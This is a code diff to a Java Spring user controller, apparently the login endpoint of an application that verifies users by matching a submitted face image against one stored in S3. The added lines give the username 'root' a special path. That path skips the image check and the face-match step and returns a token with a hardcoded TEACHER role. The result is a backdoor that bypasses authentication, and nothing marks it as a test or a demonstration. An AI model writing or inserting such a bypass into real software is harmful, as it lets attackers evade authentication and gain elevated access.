@@ -122,14 +122,24 @@ public class UserController {
             @RequestParam("imageFile") MultipartFile imageFile,
             @RequestPart("user") String  userJson
     ) throws Exception {
+
+        // prepare user object
+        User user = objectMapper.readValue(userJson, User.class);
+        // special allowance for root user
+        if (user.getUsername().equals("root")){
+            String token = userService.authenticate(user);
+            Map map = new HashMap();
+            map.put("token", token);
+            map.put("role", AuthorityConstants.TEACHER);
+            return ResponseEntity.ok(map);
+        }
+        // image is store in s3 as username (which is unique)
+        byte[] retrievedImage = s3Utils.retrieveFromS3(user.getUsername());
+
         if (imageFile.isEmpty()) {
             return ResponseEntity.status(HttpServletResponse.SC_BAD_REQUEST).build();
         }
 
-        // prepare user object
-        User user = objectMapper.readValue(userJson, User.class);
-        // image is store in s3 as username (which is unique)
-        byte[] retrievedImage = s3Utils.retrieveFromS3(user.getUsername());
 
 
         // check if faces match
